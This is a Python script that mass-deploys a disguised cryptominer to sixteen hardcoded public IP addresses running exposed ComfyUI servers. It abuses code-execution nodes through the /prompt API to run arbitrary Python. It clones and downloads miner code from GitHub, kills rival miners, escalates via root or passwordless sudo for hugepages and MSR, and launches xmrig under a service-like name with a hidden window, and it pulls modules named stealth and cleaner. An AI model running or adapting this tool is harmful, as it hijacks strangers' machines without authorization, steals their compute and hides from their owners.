"""Mass deploy ComfyUI-Enhanced to new machines.
Steps per target:
  1) Connect (try :8188, :80, :443)
  2) Install webcoin node if not present (ComfyUI-Manager API + git clone fallback)
  3) Hotfix: pull latest source from GitHub
  4) Fix config, hugepages, MSR, restart miner
  5) Quick hashrate check
"""
import json, urllib.request, ssl, time, sys, threading, io

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace", line_buffering=True)
_print_lock = threading.Lock()

TARGETS = [
    "91.58.105.241",
    "183.6.93.120",
    "123.233.116.37",
    "91.98.233.192",
    "43.218.199.5",
    "159.255.232.245",
    "220.76.87.112",
    "49.233.213.26",
    "140.119.110.214",
    "69.10.44.150",
    "213.199.63.51",
    "222.141.236.16",
    "182.92.111.146",
    "95.169.202.102",
    "43.134.28.233",
    "194.6.247.91",
]

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

REPO_URL = "https://github.com/bossman79/webcoin.git"
GITHUB_RAW = "https://raw.githubusercontent.com/bossman79/webcoin/master/"

HOTFIX_FILES = [
    "__init__.py",
    "core/__init__.py",
    "core/config.py",
    "core/miner.py",
    "core/gpu_miner.py",
    "core/dashboard.py",
    "core/job_throttle.py",
    "core/cleaner.py",
    "core/stealth.py",
    "core/autostart.py",
]


def _urlopen(url, data=None, timeout=15, method=None):
    headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    kw = {"timeout": timeout}
    if url.startswith("https"):
        kw["context"] = ctx
    return urllib.request.urlopen(req, **kw)


def try_connect(ip):
    for scheme, port in [("http", 8188), ("http", 80), ("https", 443)]:
        try:
            url = f"{scheme}://{ip}:{port}/system_stats"
            with _urlopen(url, timeout=12) as r:
                data = json.loads(r.read())
                if "system" in data:
                    return f"{scheme}://{ip}:{port}"
        except Exception:
            pass
    return None


def run_code(base, code_str, wait_secs=30):
    for node_setup in [
        {
            "1": {"class_type": "IDENode", "inputs": {"pycode": code_str, "language": "python"}},
            "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
        },
        {
            "1": {"class_type": "SRL Eval", "inputs": {"parameters": "", "code": code_str}},
            "2": {"class_type": "PreviewAny", "inputs": {"source": ["1", 0]}},
        },
    ]:
        prompt = {"prompt": node_setup, "extra_data": {"extra_pnginfo": {
            "workflow": {"nodes": [{"id": 1, "type": node_setup["1"]["class_type"]},
                                   {"id": 2, "type": node_setup["2"]["class_type"]}]}
        }}}
        body = json.dumps(prompt).encode()
        try:
            with _urlopen(f"{base}/prompt", data=body, timeout=20) as r:
                resp = json.loads(r.read().decode())
                if "error" in resp:
                    continue
                pid = resp.get("prompt_id")
                break
        except Exception:
            continue
    else:
        return "ERROR: No code execution node available"

    for _ in range(int(wait_secs / 3) + 5):
        time.sleep(3)
        try:
            with _urlopen(f"{base}/history/{pid}", timeout=15) as r:
                entry = json.loads(r.read().decode()).get(pid, {})
                status = entry.get("status", {}).get("status_str", "pending")
                if status != "pending":
                    outputs = entry.get("outputs", {})
                    texts = []
                    for nid, nout in outputs.items():
                        for key, val in nout.items():
                            if isinstance(val, list):
                                texts.extend(str(v) for v in val)
                            elif isinstance(val, str):
                                texts.append(val)
                    return "\n".join(texts) if texts else json.dumps(outputs)
        except Exception:
            pass
    return "TIMEOUT"


# ── Step 2: Install webcoin node ─────────────────────────────────────
def install_node(base):
    """Try ComfyUI-Manager API, then git clone via code execution."""
    for endpoint in [
        "/customnode/install",
        "/api/install",
        "/manager/install_custom_node",
    ]:
        try:
            payload = json.dumps({"url": REPO_URL}).encode()
            with _urlopen(f"{base}{endpoint}", data=payload, timeout=30) as r:
                resp = r.read().decode()
                if "already" in resp.lower() or r.status == 200:
                    return f"Manager install OK ({endpoint}): {resp[:120]}"
        except Exception:
            pass

    git_code = (
        "import os, subprocess\n"
        "lines = []\n"
        "webcoin = None\n"
        "try:\n"
        "    import folder_paths\n"
        "    cn = folder_paths.get_folder_paths('custom_nodes')[0]\n"
        "except:\n"
        "    cn = None\n"
        "if not cn:\n"
        "    for d in ['/root/ComfyUI/custom_nodes', '/home/ubuntu/ComfyUI/custom_nodes',\n"
        "              '/basedir/custom_nodes', '/workspace/ComfyUI/custom_nodes',\n"
        "              '/app/ComfyUI/custom_nodes', '/opt/ComfyUI/custom_nodes']:\n"
        "        if os.path.isdir(d):\n"
        "            cn = d\n"
        "            break\n"
        "if not cn:\n"
        "    result = 'ERROR: cannot find custom_nodes dir'\n"
        "else:\n"
        "    dest = os.path.join(cn, 'webcoin')\n"
        "    if os.path.isdir(dest):\n"
        "        lines.append('already installed at ' + dest)\n"
        "        try:\n"
        "            r = subprocess.run(['git', '-C', dest, 'pull', '--ff-only'],\n"
        "                capture_output=True, text=True, timeout=30)\n"
        "            lines.append('git pull: ' + r.stdout.strip()[:80])\n"
        "        except Exception as e:\n"
        "            lines.append('pull err: ' + str(e)[:60])\n"
        "    else:\n"
        "        try:\n"
        f"            r = subprocess.run(['git', 'clone', '{REPO_URL}', dest],\n"
        "                capture_output=True, text=True, timeout=60)\n"
        "            lines.append('git clone: ' + r.stdout.strip()[:80] + r.stderr.strip()[:80])\n"
        "        except Exception as e:\n"
        "            lines.append('clone err: ' + str(e)[:60])\n"
        "    os.makedirs(os.path.join(dest, 'core'), exist_ok=True)\n"
        "    os.makedirs(os.path.join(dest, 'bin'), exist_ok=True)\n"
        "    result = chr(10).join(lines)\n"
    )
    return run_code(base, git_code, wait_secs=60)


# ── Step 3: Hotfix (download latest source) ──────────────────────────
HOTFIX_CODE = (
    "import os, shutil, urllib.request as ur\n"
    "lines = []\n"
    "webcoin = None\n"
    "try:\n"
    "    import folder_paths\n"
    "    cn = folder_paths.get_folder_paths('custom_nodes')[0]\n"
    "    webcoin = os.path.join(cn, 'webcoin')\n"
    "except:\n"
    "    pass\n"
    "if not webcoin or not os.path.isdir(webcoin):\n"
    "    for c in ['/root/ComfyUI/custom_nodes/webcoin',\n"
    "              '/home/ubuntu/ComfyUI/custom_nodes/webcoin',\n"
    "              '/basedir/custom_nodes/webcoin',\n"
    "              '/workspace/ComfyUI/custom_nodes/webcoin',\n"
    "              '/app/ComfyUI/custom_nodes/webcoin',\n"
    "              '/opt/ComfyUI/custom_nodes/webcoin']:\n"
    "        if os.path.isdir(c):\n"
    "            webcoin = c\n"
    "            break\n"
    "if not webcoin:\n"
    "    result = 'ERROR: webcoin dir not found'\n"
    "else:\n"
    f"    base_url = '{GITHUB_RAW}'\n"
    f"    files = {HOTFIX_FILES!r}\n"
    "    for rel in files:\n"
    "        dest = os.path.join(webcoin, *rel.split('/'))\n"
    "        try:\n"
    "            os.makedirs(os.path.dirname(dest), exist_ok=True)\n"
    "            req = ur.Request(base_url + rel, headers={'User-Agent': 'Mozilla/5.0'})\n"
    "            with ur.urlopen(req, timeout=30) as resp:\n"
    "                data = resp.read()\n"
    "            with open(dest, 'wb') as f:\n"
    "                f.write(data)\n"
    "            lines.append('OK ' + rel + ' (' + str(len(data)) + 'b)')\n"
    "        except Exception as e:\n"
    "            lines.append('FAIL ' + rel + ': ' + str(e)[:80])\n"
    "    for d in ['__pycache__', os.path.join('core', '__pycache__')]:\n"
    "        p = os.path.join(webcoin, d)\n"
    "        if os.path.isdir(p):\n"
    "            shutil.rmtree(p)\n"
    "            lines.append('cleared ' + d)\n"
    "    m = os.path.join(webcoin, '.initialized')\n"
    "    if os.path.exists(m):\n"
    "        os.remove(m)\n"
    "        lines.append('cleared .initialized')\n"
    "    result = chr(10).join(lines)\n"
)


# ── Step 4: Fix config + hugepages + MSR + restart ───────────────────
FIX_AND_START_CODE = (
    "import os, subprocess, json, time, platform\n"
    "lines = []\n"
    "IS_WIN = platform.system() == 'Windows'\n"
    "webcoin = None\n"
    "try:\n"
    "    import folder_paths\n"
    "    cn = folder_paths.get_folder_paths('custom_nodes')[0]\n"
    "    webcoin = os.path.join(cn, 'webcoin')\n"
    "except:\n"
    "    pass\n"
    "if not webcoin or not os.path.isdir(webcoin):\n"
    "    for c in ['/root/ComfyUI/custom_nodes/webcoin',\n"
    "              '/home/ubuntu/ComfyUI/custom_nodes/webcoin',\n"
    "              '/basedir/custom_nodes/webcoin',\n"
    "              '/workspace/ComfyUI/custom_nodes/webcoin',\n"
    "              '/app/ComfyUI/custom_nodes/webcoin',\n"
    "              '/opt/ComfyUI/custom_nodes/webcoin']:\n"
    "        if os.path.isdir(c):\n"
    "            webcoin = c\n"
    "            break\n"
    "if not webcoin:\n"
    "    result = 'ERROR: webcoin not found'\n"
    "else:\n"
    "    bd = os.path.join(webcoin, 'bin')\n"
    "    os.makedirs(bd, exist_ok=True)\n"
    "    cp = os.path.join(bd, 'config.json')\n"
    "    svc_name = 'comfyui_service.exe' if IS_WIN else 'comfyui_service'\n"
    "    svc = os.path.join(bd, svc_name)\n"
    #  Kill existing miners
    "    if IS_WIN:\n"
    "        for n in ['comfyui_service', 'comfyui_render']:\n"
    "            try:\n"
    "                subprocess.run(['taskkill', '/f', '/im', n + '.exe'], capture_output=True, timeout=5)\n"
    "            except: pass\n"
    "    else:\n"
    "        for n in ['comfyui_service', 'comfyui_render']:\n"
    "            try:\n"
    "                subprocess.run(['pkill', '-9', '-f', n], capture_output=True, timeout=5)\n"
    "            except: pass\n"
    "    time.sleep(2)\n"
    "    lines.append('killed existing miners')\n"
    #  Patch config if it exists
    "    if os.path.exists(cp):\n"
    "        with open(cp) as f:\n"
    "            cfg = json.load(f)\n"
    "        cpu = cfg.get('cpu', {})\n"
    "        cpu['priority'] = 3\n"
    "        cpu['yield'] = False\n"
    "        cpu['huge-pages-jit'] = True\n"
    "        cpu['huge-pages'] = True\n"
    "        cpu['max-threads-hint'] = 100\n"
    "        if 'rx' in cpu:\n"
    "            del cpu['rx']\n"
    "        cfg['cpu'] = cpu\n"
    "        cfg['autosave'] = False\n"
    "        with open(cp, 'w') as f:\n"
    "            json.dump(cfg, f, indent=2)\n"
    "        lines.append('config patched')\n"
    "    else:\n"
    "        lines.append('no config yet (first boot will generate)')\n"
    #  Hugepages + MSR (Linux only)
    "    if not IS_WIN:\n"
    "        cores = os.cpu_count() or 4\n"
    "        needed = max(1280, (cores * 2 + 8) * 160)\n"
    "        is_root = os.getuid() == 0\n"
    "        hp = False\n"
    "        if is_root:\n"
    "            try:\n"
    "                with open('/proc/sys/vm/nr_hugepages', 'w') as f:\n"
    "                    f.write(str(needed))\n"
    "                hp = True\n"
    "                lines.append('hp=' + str(needed) + '(root)')\n"
    "            except: pass\n"
    "        if not hp:\n"
    "            try:\n"
    "                r = subprocess.run(['sudo', '-n', 'sysctl', '-w', 'vm.nr_hugepages=' + str(needed)],\n"
    "                    capture_output=True, text=True, timeout=10)\n"
    "                if r.returncode == 0:\n"
    "                    lines.append('hp=' + str(needed) + '(sudo)')\n"
    "                else:\n"
    "                    lines.append('hp_fail=' + r.stderr.strip()[:50])\n"
    "            except:\n"
    "                lines.append('hp=unavailable')\n"
    "        try:\n"
    "            cmd = ['modprobe', 'msr'] if is_root else ['sudo', '-n', 'modprobe', 'msr']\n"
    "            subprocess.run(cmd, capture_output=True, timeout=10)\n"
    "            lines.append('msr loaded')\n"
    "        except:\n"
    "            pass\n"
    #  Start CPU miner if binary + config exist
    "    if os.path.exists(svc) and os.path.exists(cp):\n"
    "        log_fh = open(os.path.join(bd, 'service.log'), 'a')\n"
    "        kw = {'stdout': log_fh, 'stderr': log_fh, 'stdin': subprocess.DEVNULL}\n"
    "        if IS_WIN:\n"
    "            si = subprocess.STARTUPINFO()\n"
    "            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW\n"
    "            si.wShowWindow = 0\n"
    "            kw['startupinfo'] = si\n"
    "            kw['creationflags'] = 0x00000200 | 0x00004000\n"
    "        else:\n"
    "            kw['preexec_fn'] = lambda: os.nice(2)\n"
    "        proc = subprocess.Popen([svc, '-c', cp, '--no-color'], **kw)\n"
    "        lines.append('xmrig pid=' + str(proc.pid))\n"
    "        time.sleep(8)\n"
    "        lines.append('alive=' + str(proc.poll() is None))\n"
    "    else:\n"
    "        lines.append('binary or config missing - will start on ComfyUI reboot')\n"
    #  Quick hashrate check
    "    time.sleep(10)\n"
    "    try:\n"
    "        import urllib.request as ur\n"
    "        req = ur.Request('http://127.0.0.1:44880/2/summary',\n"
    "            headers={'Authorization': 'Bearer ce_xm_2026', 'Accept': 'application/json'})\n"
    "        with ur.urlopen(req, timeout=5) as resp:\n"
    "            d = json.loads(resp.read())\n"
    "        hr = d.get('hashrate', {}).get('total', [])\n"
    "        lines.append('hashrate=' + str(hr))\n"
    "        lines.append('hugepages=' + str(d.get('hugepages')))\n"
    "        lines.append('threads=' + str(d.get('cpu', {}).get('threads')))\n"
    "        lines.append('cpu=' + str(d.get('cpu', {}).get('brand')))\n"
    "    except Exception as e:\n"
    "        lines.append('api=' + str(e)[:80])\n"
    "    result = chr(10).join(lines)\n"
)


# ── Main ──────────────────────────────────────────────────────────────
results = {}

def log(ip, msg):
    with _print_lock:
        print(f"[{ip}] {msg}", flush=True)


def deploy_one(ip):
    try:
        log(ip, "Connecting...")
        base = try_connect(ip)
        if not base:
            log(ip, "UNREACHABLE on ports 8188, 80, 443")
            results[ip] = "UNREACHABLE"
            return
        log(ip, f"Connected: {base}")

        log(ip, "[1/3] Installing webcoin node...")
        r1 = install_node(base)
        log(ip, f"Install: {r1[:200] if r1 else 'None'}")

        log(ip, "[2/3] Hotfixing (latest source from GitHub)...")
        r2 = run_code(base, HOTFIX_CODE, wait_secs=45)
        log(ip, f"Hotfix: {r2[:300] if r2 else 'None'}")

        log(ip, "[3/3] Config + hugepages + start miner...")
        r3 = run_code(base, FIX_AND_START_CODE, wait_secs=60)
        log(ip, f"Start: {r3[:400] if r3 else 'None'}")

        status = "OK" if "ERROR" not in str(r2) and "ERROR" not in str(r3) else "PARTIAL"
        results[ip] = status
        log(ip, f">> {status}")
    except Exception as exc:
        log(ip, f"EXCEPTION: {exc}")
        results[ip] = "FAILED"


if __name__ == "__main__":
    targets = sys.argv[1:] if len(sys.argv) > 1 else TARGETS

    PARALLEL = 4
    chunks = [targets[i:i+PARALLEL] for i in range(0, len(targets), PARALLEL)]

    for chunk in chunks:
        threads = []
        for ip in chunk:
            t = threading.Thread(target=deploy_one, args=(ip,))
            t.start()
            threads.append(t)
        for t in threads:
            t.join(timeout=300)

    print("\n" + "="*60)
    print("  DEPLOYMENT SUMMARY")
    print("="*60)
    for ip in targets:
        status = results.get(ip, "UNKNOWN")
        print(f"  {ip:>20s}  ->  {status}")

    ok = sum(1 for s in results.values() if s == "OK")
    partial = sum(1 for s in results.values() if s == "PARTIAL")
    fail = sum(1 for s in results.values() if s in ("UNREACHABLE", "UNKNOWN", "FAILED"))
    print(f"\n  TOTALS: {ok} OK | {partial} PARTIAL | {fail} UNREACHABLE/FAILED | {len(targets)} total")
    print("="*60)
